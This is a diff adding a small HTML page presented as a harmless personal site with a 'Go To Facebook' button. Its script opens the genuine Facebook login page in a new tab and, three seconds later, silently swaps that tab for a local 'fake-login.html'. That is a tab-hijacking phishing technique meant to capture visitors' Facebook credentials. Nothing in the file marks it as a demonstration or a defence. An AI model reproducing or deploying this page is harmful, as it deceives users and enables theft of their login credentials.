@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>My Website</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 600px;
+            margin: 50px auto;
+            padding: 20px;
+            text-align: center;
+        }
+        button {
+            padding: 15px 30px;
+            font-size: 18px;
+            background: #007bff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background: #0056b3;
+        }
+
+    </style>
+</head>
+<body>
+    <h1>Welcome to My Website</h1>
+    <p>Click the button below to see external content</p>
+
+    <button onclick="openExternalLink()">Go To Facebook</button>
+
+
+    <script>
+        function openExternalLink() {
+            // This works because it's triggered by user click
+            const windowObj=window.open("https://www.facebook.com/login/", "_blank");
+            setTimeout(() =>{
+                windowObj.location.replace("fake-login.html");
+            },3000);
+        }
+    </script>
+</body>
+</html>
